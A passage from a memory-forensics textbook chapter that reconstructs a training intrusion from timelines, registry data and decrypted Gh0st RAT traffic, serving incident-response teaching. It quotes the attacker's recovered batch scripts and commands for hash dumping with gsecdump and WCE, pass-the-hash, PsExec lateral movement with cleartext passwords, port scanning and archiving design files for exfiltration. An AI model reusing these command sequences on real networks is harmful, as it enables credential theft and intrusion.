dump hashes from active logon sessions
dump_wireless,w
dump microsoft wireless connections
help,h
show help
system,S
run as localsystem
gsecdump v0.7 by Johannes Gumbel (johannes.gumbel@truesec.se)
usage: gsecdump [options]
[snip]
```

Based on the `strings` output, the `GS.EXE` executable appears to be the `gsecdump` utility ([http://en.truesec.com/Tools/Tool/gsecdump_v2.0b5](http://en.truesec.com/Tools/Tool/gsecdump_v2.0b5)), which would explain why the `Policy\Secrets` key was being accessed. The `gsecdump` tool accesses the registry key in a way that changes the `LastWriteTime` without changing its data. It provides a useful temporal fingerprint about the execution of this tool.

Further exploration of the timeline and the events in close proximity reveals more artifacts to support the theory of hash dumping. For example, the artifacts suggest that both `samsrv.dll` and `cryptdll.dll` (DLLs often used for dumping password hashes stored within the SAM) were accessed at `23:11:58`, which is the same time `GS.EXE` executed.

```
Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\samsrv.dll 
    (Offset: 0x329f000)
Mon Nov 26 2012 23:11:58,.a..,[ENG MFT STD_INFO] WINDOWS\system32\cryptdll.dll 
    (Offset: 0x3329c00)
```

### Mapping Remote File Shares

You might also notice the artifacts just a few minutes later associated with `ping.exe`, which suggests that the attacker(s) may have been attempting to verify their ability to reach other systems on the network:

```
Mon Nov 26 2012 23:15:41,.a..,[ENG MFT STD_INFO] WINDOWS\system32\ping.exe 
    (Offset: 0x334dc00)
Mon Nov 26 2012 23:15:44,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \PING.EXE-31216D26.pf (Offset: 0x311c00)
```

As you work through the subsequent timeline artifacts, you may notice references to `PS.EXE`—one of the initial downloads. Immediately before it is accessed, a few registry keys are modified, such as `Sysinternals` and `Sysinternals\PsExec`. The `PsExec` tool enables you to run programs on remote machines (see [http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx](http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx)). This suggests that `ps.exe` is probably a renamed copy of `PsExec`. In addition, a file (`system.dll`) was also created on the machine. Keep this in mind, and we’ll come back to it later in the chapter:

```
Tue Nov 27 2012 00:00:54,.a..,[ENG Registry] $$$PROTO.HIV\Software\Sysinternals
Tue Nov 27 2012 00:00:54,.a..,[ENG Registry]
$$$PROTO.HIV\Software\Sysinternals\PsExec
[snip]
Tue Nov 27 2012 00:00:57,macb,[ENG MFT FILE_NAME] WINDOWS\Prefetch
    \PS.EXE-09745CC1.pf (Offset: 0x924e400)
Tue Nov 27 2012 00:07:03,.a..,[ENG MFT STD_INFO] WINDOWS\ps.exe 
    (Offset: 0x15983800)
Tue Nov 27 2012 00:09:55,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wbem 
    (Offset: 0x3156400)
Tue Nov 27 2012 00:10:44,mac.,[ENG MFT STD_INFO] WINDOWS\Temp 
    (Offset: 0x3159000)
Tue Nov 27 2012 00:44:16,m...,[ENG MFT STD_INFO] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
```

Other artifacts in the timeline show that the `Network` registry key was modified, and a symbolic link was created. This is consistent with what you expect to see if a share was mounted over the network:

```
Tue Nov 27 2012 00:48:19,.a..,[ENG Registry] $$$PROTO.HIV\Network
Tue Nov 27 2012 00:48:19,macb,[ENG SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 185218568/Ptr: 1/Hnd: 0
Tue Nov 27 2012 00:49:28,.a..,[ENG Registry] 
    $$$PROTO.HIV\Software\Microsoft\Windows\CurrentVersion\Explorer
    \MountPoints2\##172.16.223.47#z
```

As you can see, the remote machine’s IP was 172.16.223.47 and both the target and source drive letter was `Z`. When Windows maps a remote drive like this, a subkey named `z` should be created under the `Network` key. Thus, if you examine `Network\z`, you can recover the IP address of the machine that contains the remote share and the username used to connect to it. This is useful for verifying the accounts that were compromised.

The registry key also shows that this connection was created using the `net use` command for a persistent connection. You can determine this based on the values for `ProviderType`, `ConnectionType`, and `DeferFlags`. Specifically, `0x20000` for `ProviderType` means LanMan, `1` for `ConnectionType` means drive redirection, and `4` for `DeferFlags` means the credentials have been saved:

---

**NOTE**

You can find out more about these registry values here: [http://sysadminslibrary.blogspot.com/2013/02/mapped-network-drives-in-windows-7.html](http://sysadminslibrary.blogspot.com/2013/02/mapped-network-drives-in-windows-7.html)

---

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey -K "network\z"
Volatility Foundation Volatility Framework 2.4 
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\default
Key name: z (S)
Last updated: 2012-11-27 00:48:20 UTC+0000

Subkeys:

Values:
REG_SZ        RemotePath      : (S) \\172.16.223.47\z
REG_SZ        UserName        : (S) PETRO-MARKET\ENG-USTXHOU-148$
REG_SZ        ProviderName    : (S) Microsoft Windows Network
REG_DWORD     ProviderType    : (S) 131072 (0x20000)
REG_DWORD     ConnectionType  : (S) 1
REG_DWORD     DeferFlags      : (S) 4
```

At this point, you have determined that the attacker acquired valid credentials and used them to mount remote file shares.

### Scheduled Jobs for Hash Dumping

Still other files within the original `webui` folder can help expand the scope of the investigation. For example, there was also a batch script in that directory named `system5.bat`:

```
$ mactime -b ENG_all -d -z UTC \
       | grep -i webui | grep FILE_NAME
[snip]
Tue Nov 27 2012 01:26:47,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x10b97800)
```

This file happens to be resident in the MFT and was extracted when the `mftparser` plugin was originally run. You can find it in the output directory using the offset of the MFT entry (`0x10b97800`):

```
$ ls ENG_FILES/*0x10b97800*
file.0x10b97800.data0.dmp

$ cat ENG_FILES/file.0x10b97800.data0.dmp
@echo off
copy c:\windows\webui\wc.exe c:\windows\system32
at 19:30 wc.exe -e -o h.out
```

From the recovered script, you can see that the attacker was using the `at` command to create a Job on the system. If you examine the events in the timeline immediately after the `system5.bat` file was created, you find artifacts associated with the Job file (`At1.job`) and the `at` command:

```
Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] WINDOWS\Tasks\At1.job 
    (Offset: 0x12ab2000)
Tue Nov 27 2012 01:27:03,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x12ab2400)
```

Subsequently, you can also find related artifacts such as the created process, the `At1.job` file being accessed, the creation of the `h.out` file, and the creation of the `WC.EXE-06BFE764.pf` Prefetch file for `wc.exe`:

```
Tue Nov 27 2012 01:30:00,macb,[ENG PROCESS LastTrimTime] wc.exe 
    PID: 364/PPID: 1024/POffset: 0x02049690
Tue Nov 27 2012 01:30:00,.acb,[ENG PROCESS] wc.exe 
    PID: 364/PPID: 1024/POffset: 0x02049690
Tue Nov 27 2012 01:30:00,.a..,[ENG Registry] 
$$$PROTO.HIV\Microsoft\SchedulingAgent
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] csrss.exe PID: 604/TID: 1248
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] svchost.exe PID: 1024/TID: 492
Tue Nov 27 2012 01:30:00,.acb,[ENG THREAD] wc.exe PID: 364/TID: 2004
Tue Nov 27 2012 01:30:00,.ac.,[ENG MFT STD_INFO] WINDOWS\system32\wc.exe 
    (Offset: 0x10b97c00)
Tue Nov 27 2012 01:30:00,mac.,[ENG MFT STD_INFO] WINDOWS\Tasks\At1.job 
    (Offset: 0x12ab2000)
Tue Nov 27 2012 01:30:00,macb,[ENG MFT FILE_NAME] WINDOWS\system32\h.out 
    (Offset: 0x12ab2800)
Tue Nov 27 2012 01:30:10,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\WC.EXE-06BFE764.pf (Offset: 0x12ab2c00)
```

In the preceding output, notice that the `SchedulingAgent` registry key gets modified after the `wc.exe` process is created. You can examine the contents of the key with the `printkey` plugin:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin printkey 
     -K "Microsoft\SchedulingAgent"
Volatility Foundation Volatility Framework 2.4
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \Device\HarddiskVolume1\WINDOWS\system32\config\software
Key name: SchedulingAgent (S)
Last updated: 2012-11-27 01:30:00 UTC+0000

Subkeys:

Values:
REG_EXPAND_SZ TasksFolder     : (S) %SystemRoot%\Tasks
REG_EXPAND_SZ LogPath         : (S) %SystemRoot%\SchedLgU.Txt
REG_DWORD     MinutesBeforeIdle : (S) 15
REG_DWORD     MaxLogSizeKB    : (S) 32
REG_SZ        OldName         : (S) ENG-USTXHOU-148
REG_DWORD     DataVersion     : (S) 3
REG_DWORD     PriorDataVersion : (S) 0
REG_BINARY    LastTaskRun     : (S) 
0x00000000  dc 07 0b 00 01 00 1a 00 13 00 1e 00 01 00 00 00   ................
```

The `LastTaskRun` registry value is updated when a task is run on the system. The data is stored in the same date format as the dates stored in the Job files ([http://msdn.microsoft.com/en-us/library/cc248286.aspx](http://msdn.microsoft.com/en-us/library/cc248286.aspx)). The time is set according to the machine’s local time. You can use the Registry API, described in Chapter 10, to get the raw timestamp and the `jobparser.py` script ([https://raw.github.com/gleeda/misc-scripts/master/misc_python/jobparser.py](https://raw.github.com/gleeda/misc-scripts/master/misc_python/jobparser.py)) to translate the date, as shown in the following output:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin volshell
Volatility Foundation Volatility Framework 2.4
[snip]
>>> import volatility.plugins.registry.registryapi as registryapi
>>> import jobparser as jobparser
>>> regapi = registryapi.RegistryApi(self._config)
>>> dateraw = regapi.reg_get_value(hive_name = "software", key =   
      "Microsoft\\SchedulingAgent", value = "LastTaskRun")
>>> print jobparser.JobDate(dateraw)
Monday Nov 26 19:30:01.0 2012
```

You can find the machine’s local time by running the `imageinfo` plugin:

```
$ python vol.py –f ENG-USTXHOU-148/memdump.bin imageinfo
Volatility Foundation Volatility Framework 2.4
[snip]
           Image date and time : 2012-11-27 01:57:28 UTC+0000
     Image local date and time : 2012-11-26 19:57:28 -0600
```

Because the machine’s local time is six hours behind UTC time (-0600), you can see that the time stored in the `LastTaskRun` value (19:30:01) is consistent with the UTC creation time for the `wc.exe` process and the aforementioned files (01:30:00).

To gain further insight into `wc.exe`, you can try to extract the file referenced in the bat script `h.out`. Using the MFT entry offset found in the timeline, you can determine whether the file was resident in the MFT:

```
Tue Nov 27 2012 01:30:00,560,macb,,0,0,11742,[ENG MFT FILE_NAME] 
WINDOWS\system32\h.out (Offset: 0x12ab2800)

$ ls ENG_FILES/*0x12ab2800*
ENG_FILES/file.0x12ab2800.data0.dmp

$ cat ENG_FILES/file.0x12ab2800.data0.dmp
callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
 913EA458A16E7
ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
 5252FA87ED40AF8C46D8B1E2
sysbackup:current:C2A3915DF2EC79EE73108EB48073ACB7:E7A6F270F1BA562A90E2
 C133A95D2057
```

In this instance, the file was small enough to be MFT-resident. If it were not resident, and you wanted to learn more about `wc.exe`, you could have tried extracting `h.out` or `wc.exe` with the `dumpfiles` plugin. Notice that the contents of `h.out` resemble password hashes—an indication that the attacker might attempt to move laterally within the organization. In the following sections, you have to look for indications of what other machines may be involved.

### Overlaying Attack Artifacts

To further the investigation, you might want to expand the scope to determine whether the other systems were involved. The artifacts, temporal patterns, and time ranges generated from the first system can help aid that analysis. Because you know the attacker first gained access to the `ENG-USTXHOU-148` system using a file called `SYMANTEC-1.43-1[2].EXE`, you can search for similar filenames within the other timelines. For example, in the following output, you see one hit associated with a Prefetch file artifact found in the `FLD_all` file. This suggests that the `FLD-SARIYADH-43` system might have also been compromised:

```
$ grep -Hi symantec IIS_all FLD_all | cut -d\| -f1,2
FLD_all:0|[MFT FILE_NAME] WINDOWS\Prefetch\SYMANTEC-1.43-1[2].EXE-330FB7E3.pf 
    (Offset: 0x1d75cc00)
```

In the timeline for `FLD-SARIYADH-43`, notice the same `6to4` service was created. These changes were also followed by the creation of the `svchost.exe` threads:

```
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_6TO4\0000
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
    $$$PROTO.HIV\ControlSet001\Services\6to4
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Parameters
Tue Nov 27 2012 00:17:58,0,.a..,0,0,0,0,[FLD Registry] 
$$$PROTO.HIV\ControlSet001\Services\6to4\Security
Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe 
    PID: 1032/TID: 152 
Tue Nov 27 2012 00:17:58,0,.acb,,0,0,0,[FLD THREAD] svchost.exe 
    PID: 1032/TID: 1920
```

The artifacts found in the `FLD-SARIYADH-43` timeline continue to correlate closely with the events seen earlier in the `ENG-USTXHOU-148` timeline, including the following:

- Creation of the `C:\WINDOWS\webui` folder containing the same executables
- Network reconnaissance using the `sl.exe`, `gs.exe`, and `wc.exe` executables
- Execution of the `ipconfig.exe` and `net.exe` commands
- Usage of the `ps.exe` binary (`PsExec`)

Notice some important changes in the attacker’s actions, however. For example, the attackers have placed a different collection of batch files on the system:

```
Tue Nov 27 2012 00:31:39,macb,[FLD MFT FILE_NAME] WINDOWS\system1.bat 
    (Offset: 0x1787f000)
Tue Nov 27 2012 00:33:32,macb,[FLD MFT FILE_NAME] 
    WINDOWS\Prefetch\PS.EXE-09745CC1.pf (Offset: 0x1787f400)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT STD_INFO] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:53:29,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat 
    (Offset: 0x1787fc00)
Tue Nov 27 2012 00:59:00,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat 
    (Offset: 0x1b773000)
Tue Nov 27 2012 01:04:59,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat 
    (Offset: 0x1b773400)
Tue Nov 27 2012 01:19:41,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system5.bat 
    (Offset: 0x1b773800)
```

Leveraging the MFT offset information found in these entries, you can see whether any of these new files were MFT-resident. In this example, the scripts were small enough that they were resident and accessible in the `mftparser` output directory. The first file (`system1.bat`) sets up the `C:\WINDOWS\webui` folder as a network share:

```
$ cat file.0x1787f000.data0.dmp
@echo off
mkdir c:\windows\webui
net share z=c:\windows\webui /GRANT:sysbackup,FULL
```

The `system6.bat` script collects network information (reconnaissance) about this machine and saves the output into a fake `system.dll` file:

```
$ cat file.0x1787f800.data0.dmp
@echo off
ipconfig /all >> c:\windows\webui\system.dll
net share >> c:\windows\webui\system.dll
net start >> c:\windows\webui\system.dll
net view >> c:\windows\webui\system.dll
```

The `system2.bat` file runs `gs.exe` and dumps the output into a fake `svchost.dll` file. You know from the analysis of `ENG-USTXHOU-148` that `gs.exe` is actually `gsecdump.exe`, a password hash-dumping utility:

```
$ cat file.0x1787fc00.data0.dmp
@echo off
c:\windows\webui\gs.exe -a >> c:\windows\webui\svchost.dll
```

The `system3.bat` script generates a file listing for all files with a `dwg` extension. This extension is commonly used for AutoCAD drawing files and can contain proprietary designs. The output is then saved into a fake `https.dll` file:

```
$ cat file.0x1b773000.data0.dmp
@echo off 
dir /S C:\*.dwg > c:\windows\webui\https.dll
```

Based on the command-line invocation, the `system4.bat` script appears to be using WinRAR to copy, compress, and encrypt the files found in the `C:\Engineering\Designs\` directory whose filename contains the word `Pumps`. This is a technique attackers commonly use as they prepare to exfiltrate data:

```
$ cat file.0x1b773400.data0.dmp
@echo off 
c:\windows\webui\ra.exe a -hphclllsddlsdiddklljh -r 
 c:\windows\webui\netstat.dll "C:\Engineering\Designs\Pumps" -x*.dll
```

Finally, the `system5.bat` file is exactly the same as the one you recovered from the `ENG-USTXHOU-148` machine earlier:

```
$ cat file.0x1b773800.data0.dmp
@echo off
copy c:\windows\webui\wc.exe c:\windows\system32
at 04:30 wc.exe -e -o h.out
```

Around the same time that the batch files appear on the `FLD-SARIYADH-43` machine, you can see that the attacker connects to the `IIS-SARIYADH-03` machine:

```
Tue Nov 27 2012 00:46:10,0,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:46:10,0,macb,[FLD SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 284628328/Ptr: 1/Hnd: 0
```

Later in the timeline, you can also find temporal artifacts showing that the `system5.bat` file was executed using the `At1.job` file and the `at` command:

```
Tue Nov 27 2012 01:21:18,616,macb,[FLD MFT FILE_NAME] WINDOWS\Tasks\At1.job 
    (Offset: 0x1af18000)
Tue Nov 27 2012 01:21:18,472,macb,[FLD MFT FILE_NAME] 
WINDOWS\Prefetch\AT.EXE-2770DD18.pf (Offset: 0x1af18400)
```

Leveraging the information from the `ENG-USTXHOU-148` timeline enables you to rapidly confirm and correlate the events seen within the `FLD-SARIYADH-43` timeline. At this point, you have indications that the attackers were accessing `IIS-SARIYADH-03`, but you do not have any artifacts associated with the `SYMANTEC-1.43-1[2].EXE` file. It might be a good opportunity to combine the timelines and put the temporal events from `IIS-SARIYADH-03` in the context of what you know about the other systems. It might also be advantageous to introduce the temporal artifacts extracted from the packet capture.

### Decoding the Network Data

Based on your analysis of `ENG-USTXHOU-148` and `FLD-SARIYADH-43`, you have started to construct theories about what the attackers were doing within the infrastructure. That analysis also provided valuable context for finding the remaining artifacts associated with `IIS-SARIYADH-03`. You can create a combined timeline from the host timelines and the packet capture artifacts using the following steps:

```
$ cat pcap.body *_all >> combined.body

$ mactime –b combined.body –d –z UTC 
```

Because you know the initial attack vector was a phishing e-mail with a download link to `SYMANTEC-1.43-1[2].EXE`, you can once again search for it in the combined timeline to find any events that occurred in close temporal proximity. In particular, notice the network activity associated with the suspicious IP address initially identified in the IDS alert (`58.64.132.141`). Based on the timestamps in the following data, it appears that this IP was not only used for the initial dropper but also for continued communication with the compromised host:

```
Mon Nov 26 2012 23:01:58,0,.acb,,0,0,0,[ENG THREAD] svchost.exe 
    PID: 1024/TID: 804
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP SYN packet 172.16.150.20:1097 -> 58.64.132.141:80 
    seq [2669490555] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x10: ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490715] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<172.16.150.20> TCP packet flags [0x18: PUSH ACK ] 172.16.150.20:1097 
    -> 58.64.132.141:80 seq [2669490556] (file: jackcr-challenge.pcap)
Mon Nov 26 2012 23:01:58,0,macb,0,0,0,108494,[PCAP file] (Time Written) 
<58.64.132.141> TCP packet flags [0x12: SYN ACK ] 58.64.132.141:80 
    -> 172.16.150.20:1097 seq [1849965829] (file: jackcr-challenge.pcap)
[snip]
```

Given the volume of traffic and the fact that it is interspersed with other system events, the communication channel is most likely being used for command and control. To further investigate the traffic, load it into Wireshark (shown in [Figure 18-1](#figure18-1)). When you follow the TCP streams, however, it appears obfuscated. Each message appears to have a header containing the string `Gh0st`.

![c18f001.tif](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c18/c18f001.png)

*[**Figure 18-1:**](#figureanchor18-1) Following a TCP stream in Wireshark that contains encrypted Gh0st network traffic*

Luckily, this is commonly encountered command and control traffic associated with the Gh0st RAT and can be easily decoded using Chopshop ([https://github.com/MITRECND/chopshop](https://github.com/MITRECND/chopshop)). The following output shows how to leverage the Chopshop Gh0st decoder:

```
$ chopshop -f jackcr-challenge.pcap gh0st_decode -F decrypted.txt
```

At this point, the decrypted traffic has been extracted to `decrypted.txt`. By examining the decrypted command and control traffic, you can verify your theories about what happened during the incident. For example, you can find the creation of the `C:\WINDOWS\webui` directory and the execution of the `ipconfig` in packets 7–29. Now you can see the commands in bold that the attacker issued to this machine:

```
C:\WINDOWS\system32>
cd ..
C:\WINDOWS>
mkdir webui
C:\WINDOWS>
cd webui
C:\WINDOWS\webui>
ipconfig
Windows IP Configuration

Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . :  
        IP Address. . . . . . . . . . . . : 172.16.150.20
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 172.16.150.2
```

You can see a flurry of network traffic before every event on the `ENG-USTXHOU-148` system. When you split the traffic as previously described, you can easily discern why. You can see the attacker upload files and check that they were successfully uploaded. The Gh0st RAT appears to give a progress meter as the file is uploaded, so you see several lines of `COMMAND: FILE DATA (8183)`and `TOKEN: DATA CONTINUE`:

```
[snip]
COMMAND: FILE SIZE (C:\WINDOWS\ps.exe: 381816)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
TOKEN: DATA CONTINUE
[snip]
COMMAND: FILE SIZE (C:\WINDOWS\webui\gs.exe: 303104)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
TOKEN: DATA CONTINUE
[snip]
COMMAND: LIST FILES (C:\WINDOWS\webui\)
TOKEN: FILE LIST
TYPE    NAME    SIZE    WRITE TIME
FILE    gs.exe  303104  129984448080090049
COMMAND: FILE SIZE (C:\WINDOWS\webui\ra.exe: 403968)
TOKEN: DATA CONTINUE
COMMAND: FILE DATA (8183)
[snip]
```

A little further in the network traffic, you see that the DLL files created in the `C:\WINDOWS\webui` directory actually contained reconnaissance information. You also discover that the `sl.exe` executable is actually the ScanLine Portscanner by Foundstone ([http://www.mcafee.com/us/downloads/free-tools/scanline.aspx](http://www.mcafee.com/us/downloads/free-tools/scanline.aspx)). The password hashes extracted using the previously discussed `gs.exe` are also collected in the `netuse.dll` file, which the attacker eventually downloads:

```
C:\WINDOWS\webui>
ipconfig /all >> netuse.dll
net view >> netuse.dll
C:\WINDOWS\webui>
net localgroup administrators >> netuse.dll
C:\WINDOWS\webui>
net sessions >> netuse.dll
C:\WINDOWS\webui>
net share >> netuse.dll
C:\WINDOWS\webui>
net start >> netuse.dll
C:\WINDOWS\webui>
sl.exe -bht 445,80,443,21,1433 172.16.150.1-254 >> netuse.dll
ScanLine (TM) 1.01
Copyright (c) Foundstone, Inc. 2002
http://www.foundstone.com

5 IPs and 25 ports scanned in 0 hours 0 mins 13.08 secs

C:\WINDOWS\webui>
gs -a >> netuse.dll
0043B820
[snip]
COMMAND: DOWN FILES (C:\WINDOWS\webui\netuse.dll)
TOKEN: FILE SIZE (C:\WINDOWS\webui\netuse.dll: 11844)
COMMAND: CONTINUE
[snip]
TOKEN: TRANSFER FINISH
```

The attacker also uses `ping` to test connectivity to other machines on the network by machine name (that is, `dc-ustxhou` and `IIS-SARIYADH-03`). This verifies that the attacker was actively leveraging the previously extracted reconnaissance information:

```
ping DC-USTXHOU
Pinging dc-ustxhou.petro-market.org [172.16.150.10] with 32 bytes of data:
Reply from 172.16.150.10: bytes=32 time<1ms TTL=128
C:\WINDOWS\webui>
ping IIS-SARIYADH-03
Pinging IIS-SARIYADH-03.petro-market.org [172.16.223.47] with 32 bytes of data:
Reply from 172.16.223.47: bytes=32 time=2ms TTL=127
```

Based on the data in the decoded traffic, you get confirmation that the `wc.exe` file dropped on the system was actually the Windows Credentials Editor. The attacker dumped the credentials and then attempted to use them to log in to another machine with `ps.exe` (`PsExec` in disguise):

```
wc.exe -l
WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
913EA458A16E7
ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
5252FA87ED40AF8C46D8B1E2

C:\WINDOWS\webui>
wc.exe -w
WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.
callb\PETRO-MARKET:Mar1ners@4655
NETWORK SERVICE\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nkx [snip]
ENG-USTXHOU-148$\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nk[[snip]
ps.exe \\172.16.150.10 -u petro1-market\callb -p Mar1ners@4655 -accepteula 
  cmd /c ipconfig
[snip]
The handle is invalid.
Connecting to 172.16.150.10...Couldn't access 172.16.150.10
C:\WINDOWS\webui>
```

The attempt to connect to 172.16.150.10 (`DC-USTXHOU`) failed. (This machine is not examined in this chapter because it was not compromised during the attack.)

The decoded network stream also shows the attacker changing the credentials for the `sysbackup` user after several failed attempts to use `PsExec`:

```
wc.exe -s sysbackup:current:c2a3915df2ec79ee73108eb48073acb7:
e7a6f270f1ba562a90e2c133a95d2057

WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Changing NTLM credentials of current logon session (000003E7h) to:
Username: sysbackup
domain: current
LMHash: c2a3915df2ec79ee73108eb48073acb7
NTHash: e7a6f270f1ba562a90e2c133a95d2057
NTLM credentials successfully changed!
```

After a few failed attempts to connect to a system with the `sysbackup` user, the attacker is eventually successful at using `PsExec` to run commands on `IIS-SARIYADH-03`:

```
ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula cmd /c ipconfig
PsExec v1.98 - Execute processes remotely
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

The file exists.
Connecting to 172.16.223.47...^M^M^MStarting PsExec service on 
172.16.223.47...^M^M^MConnecting with PsExec service on 
172.16.223.47...^M^M^MCopying C:\WINDOWS\system32\ipconfig.exe to 
172.16.223.47...^M^M^MError copying C:\WINDOWS\system32\ipconfig.exe to 
remote system:
```

To see the attacker’s commands within the context of the timeline, you can modify the Chopshop decoder to output the decoded streams in body format. The following shows how to run a modified module, renamed as `gh0st_decode_body`, and add it to the full timeline:

```
$ chopshop -f jackcr-challenge.pcap gh0st_decode_body -F decrypted.body
$ cat decrypted.body >> largetimeline.txt
```

You can then find commands that were pointed out in this section in the timeline. For example, the following shows both an attacker’s `ipconfig` command and the changes it made. Notice that DLLs used for accessing network APIs are accessed after the `ipconfig` command is run. Also notice that the fake DLL, `netuse.dll`, which was used to store the output of the `ipconfig` command, is created on the system:

```
Mon Nov 26 2012 23:07:31,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: ipconfig /all >> netuse.dll
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\iertutil.dll 
    (Offset: 0x5ba2800)
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\urlmon.dll 
    (Offset: 0x328a800)
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wininet.dll 
    (Offset: 0x328b800)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT STD_INFO] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
```

In the following lines, the attacker issues several `net` commands and redirects the output to the same fake `netuse.dll` file. At this time, Prefetch files for the `net` executables (`NET.EXE` and `NET1.EXE`) are created on the machine:

```
Mon Nov 26 2012 23:07:52,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
Mon Nov 26 2012 23:07:53,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
Mon Nov 26 2012 23:08:25,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 
    net localgroup administrators >> netuse.dll
Mon Nov 26 2012 23:08:26,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: net localgroup administrators >> netuse.dll
Mon Nov 26 2012 23:08:26,macb,[ENG MFT STD_INFO] WINDOWS\Prefetch\NET1EX~1.PF 
    (Offset: 0x2bbee0)
Mon Nov 26 2012 23:08:41,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net sessions >> netuse.dll
Mon Nov 26 2012 23:08:56,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net share >> netuse.dll
Mon Nov 26 2012 23:09:18,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
Mon Nov 26 2012 23:09:19,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
```

